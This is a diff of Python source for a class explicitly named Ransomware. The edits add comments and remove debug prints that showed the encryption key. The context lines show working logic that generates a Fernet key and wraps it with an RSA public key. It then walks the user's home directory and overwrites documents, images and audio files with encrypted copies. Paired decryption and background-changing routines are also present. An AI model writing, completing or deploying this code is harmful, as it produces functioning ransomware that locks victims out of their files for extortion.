@@ -13,6 +13,7 @@ class Ransomware:
     file_extensions = ['.txt', '.pdf', '.png', 'jpg', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']
 
     def __init__(self):
+        # Get Working Directory of application
         if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
             os.chdir(sys._MEIPASS)
         self.fernetkey = None
@@ -24,11 +25,10 @@ class Ransomware:
     def create_fernet_key(self):
         self.fernetkey = Fernet.generate_key()
         self.encryptor = Fernet(self.fernetkey)
-        print(self.fernetkey)
-    
+
 
     def encrypt_fernet_key(self):
-        # Import public key to encrypt and save fernet key to file.key
+        # Import public key to encrypt and save fernet key to fernet.key
         with open('public.pem', 'rb') as f:
             self.publickey = RSA.import_key(f.read())
             
@@ -37,7 +37,8 @@ class Ransomware:
             f.write(PKenc.encrypt(self.fernetkey))
     
 
-    def decrypt_fernet_key(self, key_file):    
+    def decrypt_fernet_key(self, key_file):
+        # Import private.pem and decrypt fernet.key
         private_key = RSA.importKey(open(key_file).read())
         cipher = PKCS1_OAEP.new(private_key)
         try:
@@ -53,6 +54,7 @@ class Ransomware:
 
         
     def encrypt_os(self):
+        # Traverse Home directory and encrypt every file with selected extensions.
         for root, dirs, files in os.walk(self.localpath):
             if 'AppData' in root or '.vscode' in root:
                 pass
@@ -66,12 +68,12 @@ class Ransomware:
                             content = readf.read()
                         with open(filepath, 'wb') as writef:
                             writef.write(self.encryptor.encrypt(content))
-                        #print('Encrypted: ', filepath)
         self.encryptor = None
         self.fernetkey = None
         
 
     def decrypt_os(self):
+        # Reverse encryption of all files in Home directory
         for root, dirs, files in os.walk(self.localpath):
             if 'AppData' in root or '.vscode' in root:
                 pass
@@ -87,7 +89,6 @@ class Ransomware:
                         with open(filepath, 'wb') as writef:
                             decfile = self.encryptor.decrypt(contents)
                             writef.write(decfile)
-                        #print('decrypted :', filepath)
 
     
     def update_background(self):
